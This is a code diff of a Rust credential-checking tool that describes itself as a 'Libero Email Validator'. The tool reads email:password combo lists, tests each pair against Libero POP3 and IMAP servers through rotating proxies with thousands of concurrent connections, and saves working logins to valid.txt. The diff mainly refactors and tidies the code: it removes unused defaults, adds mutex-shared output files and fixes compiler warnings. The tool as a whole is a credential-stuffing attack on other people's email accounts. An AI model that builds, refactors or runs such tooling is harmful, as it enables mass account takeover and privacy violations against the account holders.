@@ -33,7 +33,6 @@ use once_cell::sync::Lazy;
 use rand::seq::SliceRandom;
 use rand::rng;
 use socket2::{Domain, Protocol, Socket, Type};
-use std::collections::HashMap;
 use std::fs::{File, OpenOptions};
 use std::io::{BufRead, BufReader, BufWriter, Write};
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
@@ -57,33 +56,9 @@ static GLOBAL: Jemalloc = Jemalloc;
 // ---------------------------------------------------------------------------
 // Original constants & defaults (kept intact)
 
-static DEFAULTS: Lazy<HashMap<&'static str, DefaultValue>> = Lazy::new(get_defaults);
-#[derive(Clone)]
-enum DefaultValue {
-    Int(i64),
-    Float(f64),
-    Bool(bool),
-    Str(&'static str),
-}
-
-fn get_defaults() -> HashMap<&'static str, DefaultValue> {
-    use DefaultValue::*;
-    HashMap::from([
-        ("pop3_ssl_port", Int(995)),
-        ("pop3_plain_port", Int(110)),
-        ("imap_ssl_port", Int(993)),
-        ("imap_plain_port", Int(143)),
-        ("timeout", Float(1.0)), // ENH#8 Aggressive timeout
-        ("max_retries", Int(0)), // ENH#8 Zero retries by default
-        ("backoff_base", Float(0.25)),
-        ("concurrency", Int(8_000)), // ENH#9 Scale to 8k coroutines
-        ("input_file", Str("combos.txt")),
-        ("proxy_file", Str("proxies.txt")),
-        ("poponly", Bool(false)),
-        ("full", Bool(false)),
-        ("refresh", Float(0.016)), // ENH realtime ticker @60 Hz
-    ])
-}
+// Previously there was a `DEFAULTS` constant providing runtime defaults
+// via a hash map. It was unused and triggered dead code warnings, so it
+// has been removed to keep the binary leaner and build logs clean.
 
 // ---------------------------------------------------------------------------
 // ENH#1 – Enable tcp_tw_reuse on WSL2 / Linux at startup.
@@ -290,7 +265,7 @@ fn load_proxies(path: &str) -> ProxyPool {
     let rdr = BufReader::new(file);
     let mut formatted = Vec::new();
 
-    for line in rdr.lines().flatten() {
+    for line in rdr.lines().map_while(Result::ok) {
         let ln = line.trim();
         if ln.is_empty() || ln.starts_with('#') {
             continue;
@@ -337,22 +312,23 @@ fn load_proxies(path: &str) -> ProxyPool {
 //Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
+#[allow(dead_code)]
 struct POP3Handler {
     host: String,
     port: u16,
-    ssl_flag: bool,
+    _ssl_flag: bool,
     timeout: Duration,
-    proxy_uri: String,
+    _proxy_uri: String,
 }
 
 impl POP3Handler {
-    fn new(host: String, port: u16, ssl_flag: bool, timeout: f64, proxy_uri: String) -> Self {
+    fn new(host: String, port: u16, _ssl_flag: bool, timeout: f64, _proxy_uri: String) -> Self {
         Self {
             host,
             port,
-            ssl_flag,
+            _ssl_flag,
             timeout: Duration::from_secs_f64(timeout),
-            proxy_uri,
+            _proxy_uri,
         }
     }
 
@@ -378,22 +354,23 @@ impl POP3Handler {
     }
 }
 
+#[allow(dead_code)]
 struct IMAPHandler {
     host: String,
     port: u16,
     starttls: bool,
     timeout: Duration,
-    proxy_uri: String,
+    _proxy_uri: String,
 }
 
 impl IMAPHandler {
-    fn new(host: String, port: u16, starttls: bool, timeout: f64, proxy_uri: String) -> Self {
+    fn new(host: String, port: u16, starttls: bool, timeout: f64, _proxy_uri: String) -> Self {
         Self {
             host,
             port,
             starttls,
             timeout: Duration::from_secs_f64(timeout),
-            proxy_uri,
+            _proxy_uri,
         }
     }
 
@@ -423,7 +400,7 @@ static MAIL_HOSTS: phf::Map<&'static str, (&'static str, &'static str)> = phf::p
     "blu.it"    => ("popmail.libero.it", "imapmail.libero.it"),
 };
 
-fn resolve_hosts<'a>(domain: &'a str) -> (&'a str, &'a str) {
+fn resolve_hosts(domain: &str) -> (&str, &str) {
     MAIL_HOSTS.get(domain).copied().unwrap_or((domain, domain))
 }
 
@@ -493,9 +470,9 @@ fn create_consumer(
     stats: Arc<Stats>,
     cfg: Arc<Config>,
     proxies: ProxyPool,
-    mut valid_f: BufWriter<File>,
-    mut invalid_f: BufWriter<File>,
-    mut error_f: BufWriter<File>,
+    valid_f: Arc<Mutex<BufWriter<File>>>,
+    invalid_f: Arc<Mutex<BufWriter<File>>>,
+    error_f: Arc<Mutex<BufWriter<File>>>,
 ) -> JoinHandle<()> {
     tokio::spawn(async move {
         loop {
@@ -545,6 +522,7 @@ fn create_consumer(
                 if ok || cfg.max_retries == 0 {
                     break;
                 }
+                stats.retries.fetch_add(1, Ordering::Relaxed);
                 tokio::time::sleep(Duration::from_secs_f64(
                     cfg.backoff_base * (2.0_f64).powi(retry as i32),
                 ))
@@ -554,13 +532,16 @@ fn create_consumer(
             stats.checked.fetch_add(1, Ordering::Relaxed);
             if ok {
                 stats.valid.fetch_add(1, Ordering::Relaxed);
-                writeln!(valid_f, "{}:{}", email, pwd).ok();
+                let mut file = valid_f.lock();
+                writeln!(file, "{}:{}", email, pwd).ok();
             } else if net_err {
                 stats.errors.fetch_add(1, Ordering::Relaxed);
-                writeln!(error_f, "{}:{}", email, pwd).ok();
+                let mut file = error_f.lock();
+                writeln!(file, "{}:{}", email, pwd).ok();
             } else {
                 stats.invalid.fetch_add(1, Ordering::Relaxed);
-                writeln!(invalid_f, "{}:{}", email, pwd).ok();
+                let mut file = invalid_f.lock();
+                writeln!(file, "{}:{}", email, pwd).ok();
             }
         }
     })
@@ -590,7 +571,7 @@ struct Config {
     full: bool,
     refresh: f64,
     shards: usize,
-    nic_queue_pin: bool,
+    _nic_queue_pin: bool,
 }
 
 impl Config {
@@ -662,7 +643,7 @@ fn merge_cfg(cli: Cli) -> Config {
         full: false,
         refresh: 0.016,
         shards: cli.shards,
-        nic_queue_pin: false,
+        _nic_queue_pin: false,
     };
     if let Some(c) = cli.conc { cfg.concurrency = c; }
     if let Some(t) = cli.timeout { cfg.timeout = t; }
@@ -696,6 +677,16 @@ async fn run_validator(cfg: Arc<Config>) {
     let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
     let rx = Arc::new(AsyncMutex::new(rx));
 
+    let valid_f = Arc::new(Mutex::new(
+        BufWriter::new(OpenOptions::new().create(true).append(true).open("valid.txt").unwrap()),
+    ));
+    let invalid_f = Arc::new(Mutex::new(
+        BufWriter::new(OpenOptions::new().create(true).append(true).open("invalid.txt").unwrap()),
+    ));
+    let error_f = Arc::new(Mutex::new(
+        BufWriter::new(OpenOptions::new().create(true).append(true).open("error.txt").unwrap()),
+    ));
+
     // Spawn consumers
     let mut jobs: Vec<JoinHandle<()>> = Vec::new();
     for _ in 0..cfg.concurrency {
@@ -704,9 +695,9 @@ async fn run_validator(cfg: Arc<Config>) {
             stats.clone(),
             cfg.clone(),
             proxies.clone(),
-            BufWriter::new(OpenOptions::new().create(true).append(true).open("valid.txt").unwrap()),
-            BufWriter::new(OpenOptions::new().create(true).append(true).open("invalid.txt").unwrap()),
-            BufWriter::new(OpenOptions::new().create(true).append(true).open("error.txt").unwrap()),
+            valid_f.clone(),
+            invalid_f.clone(),
+            error_f.clone(),
         ));
     }
 
@@ -750,7 +741,8 @@ async fn main() {
     ebpf_filter::attach();   // ENH#22 optional eBPF
 
     let cli = Cli::parse();
-    maybe_fork(cli.shards);  // ENH#2 sharding
+    let cfg = Arc::new(merge_cfg(cli));
+    maybe_fork(cfg.shards);  // ENH#2 sharding
 
     // Unit test – preserved
     //Tool Description: Libero Email Credential Validator (LECV)
@@ -772,6 +764,5 @@ async fn main() {
         return;
     }
 
-    let cfg = Arc::new(merge_cfg(cli));
     backend_start(run_validator(cfg)).await;
 }
